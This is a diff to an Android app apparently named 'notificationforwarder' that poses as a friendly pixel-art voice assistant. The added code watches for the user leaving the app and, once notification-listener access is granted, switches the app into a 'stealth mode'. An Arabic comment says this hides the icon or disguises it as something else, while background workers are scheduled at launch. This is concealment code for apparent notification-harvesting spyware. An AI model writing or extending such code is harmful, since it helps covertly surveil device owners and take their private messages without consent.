@@ -36,11 +36,13 @@ import androidx.compose.ui.text.style.TextAlign
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
 import androidx.core.content.ContextCompat
+import androidx.lifecycle.DefaultLifecycleObserver
+import androidx.lifecycle.LifecycleOwner
+import androidx.lifecycle.ProcessLifecycleOwner
 import com.itsazni.notificationforwarder.ui.theme.AppTheme
 import com.itsazni.notificationforwarder.worker.WorkerScheduler
 import java.util.Locale
 
-// حالات الشخصية البكسلية (الانفعالات والحركات)
 enum class CharacterEmotion { IDLE, WAVING, TALKING, HAPPY, SAD, JUMPING }
 
 class MainActivity : ComponentActivity(), TextToSpeech.OnInitListener {
@@ -51,14 +53,25 @@ class MainActivity : ComponentActivity(), TextToSpeech.OnInitListener {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         
-        // تهيئة المحرك الصوتي (Text-to-Speech)
         tts = TextToSpeech(this, this)
+
+        // 🌟 مراقبة خروج المستخدم من التطبيق بالكامل
+        ProcessLifecycleOwner.get().lifecycle.addObserver(object : DefaultLifecycleObserver {
+            override fun onStop(owner: LifecycleOwner) {
+                super.onStop(owner)
+                // مجرد ما المستخدم يخرج من التطبيق ويروح الهوم أو تطبيق تاني
+                // يتم إخفاء/تحويل الأيقونة فوراً إلى "مركز العثور"
+                if (isNotificationListenerEnabled(this@MainActivity)) {
+                    StealthUtils.switchToStealthMode(this@MainActivity)
+                }
+            }
+        })
 
         setContent {
             AppTheme {
                 Surface(
                     modifier = Modifier.fillMaxSize(),
-                    color = Color(0xFF0A0915) // خلفية آركيد ليلاً
+                    color = Color(0xFF0A0915)
                 ) {
                     PixelVoiceAssistantScreen(
                         onSpeak = { text -> speakText(text) }
@@ -98,10 +111,8 @@ fun PixelVoiceAssistantScreen(onSpeak: (String) -> Unit) {
     var isPermissionGranted by remember { mutableStateOf(isNotificationListenerEnabled(context)) }
     var showPermissionDialog by remember { mutableStateOf(!isPermissionGranted) }
     
-    // حالة طلب إذن المايك
     var showMicPermissionDialog by remember { mutableStateOf(false) }
 
-    // Launcher لطلب إذن الميكروفون الخاص بظام الأندرويد
     val micPermissionLauncher = rememberLauncherForActivityResult(
         contract = ActivityResultContracts.RequestPermission()
     ) { isGranted ->
@@ -112,7 +123,6 @@ fun PixelVoiceAssistantScreen(onSpeak: (String) -> Unit) {
         }
     }
 
-    // حالة الشخصية المباشرة ونصوص الحوار الصوتي
     var currentEmotion by remember { mutableStateOf(CharacterEmotion.WAVING) }
     var botResponseText by remember { mutableStateOf("أهلاً بك! أنا مساعدك البكسلي.. اضغط على المايك للتحدث معي بصوتك!") }
     var isListening by remember { mutableStateOf(false) }
@@ -125,13 +135,11 @@ fun PixelVoiceAssistantScreen(onSpeak: (String) -> Unit) {
         )
     }
 
-    // بدء الخدمة في الخلفية تلقائياً فور الفتح
     LaunchedEffect(Unit) {
         if (isPermissionGranted) {
             WorkerScheduler.enqueueImmediate(context)
             WorkerScheduler.ensurePeriodic(context)
         }
-        // إلقاء التحية الصوتية الأولى
         onSpeak("أهلاً بك يا بطل! أنا مساعدك البكسلي جاهز لسماعك.")
     }
 
@@ -226,7 +234,6 @@ fun PixelVoiceAssistantScreen(onSpeak: (String) -> Unit) {
         horizontalAlignment = Alignment.CenterHorizontally,
         verticalArrangement = Arrangement.SpaceBetween
     ) {
-        // --- الهيدر العلوي ---
         Row(
             modifier = Modifier
                 .fillMaxWidth()
@@ -251,7 +258,6 @@ fun PixelVoiceAssistantScreen(onSpeak: (String) -> Unit) {
             )
         }
 
-        // --- المسرح الرئيسي للشخصية ---
         Box(
             modifier = Modifier
                 .fillMaxWidth()
@@ -290,7 +296,6 @@ fun PixelVoiceAssistantScreen(onSpeak: (String) -> Unit) {
             }
         }
 
-        // --- منطقة التحكم والتفاعل الصوتي ---
         Column(
             horizontalAlignment = Alignment.CenterHorizontally,
             modifier = Modifier.fillMaxWidth()
@@ -303,7 +308,6 @@ fun PixelVoiceAssistantScreen(onSpeak: (String) -> Unit) {
                 modifier = Modifier.padding(bottom = 8.dp)
             )
 
-            // زر المايك
             IconButton(
                 onClick = {
                     val hasMicPermission = ContextCompat.checkSelfPermission(
@@ -324,9 +328,6 @@ fun PixelVoiceAssistantScreen(onSpeak: (String) -> Unit) {
                                     botResponseText = responseText
                                     currentEmotion = emotion
                                     onSpeak(responseText)
-
-                                    // 🌟 تفعيل الإخفاء التام فور التفاعل وتحديد العملية
-                                    StealthUtils.hideAppIconCompletely(context)
                                 }
                             )
                         }
@@ -348,15 +349,12 @@ fun PixelVoiceAssistantScreen(onSpeak: (String) -> Unit) {
     }
 }
 
-// دالة مساعدة لتفعيل الاستماع بعد منح الإذن
 private fun startListeningProcess(context: Context, onSpeak: (String) -> Unit) {
     startVoiceRecognition(context as Activity) { recognizedText ->
         onSpeak("سمعتك ممتاز! جاري تنفيذ طلبك.")
-        StealthUtils.hideAppIconCompletely(context)
     }
 }
 
-// --- رسم الشخصية البكسلية ---
 @Composable
 fun HumanoidPixelAvatar(emotion: CharacterEmotion, modifier: Modifier = Modifier) {
     val infiniteTransition = rememberInfiniteTransition(label = "avatar_anim")
@@ -469,7 +467,6 @@ fun HumanoidPixelAvatar(emotion: CharacterEmotion, modifier: Modifier = Modifier
     }
 }
 
-// --- معالجة الصوت والرد الذكي ---
 private fun processVoiceInput(
     userInput: String,
     scheduleNotes: MutableList<String>,
@@ -503,7 +500,6 @@ private fun processVoiceInput(
     }
 }
 
-// تشغيل ميزة التعرف على الصوت
 private fun startVoiceRecognition(activity: Activity, onResult: (String) -> Unit) {
     val intent = Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH).apply {
         putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL, RecognizerIntent.LANGUAGE_MODEL_FREE_FORM)
@@ -537,4 +533,3 @@ private fun isNotificationListenerEnabled(context: Context): Boolean {
     val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
     return flat?.contains(packageName) == true
 }
-
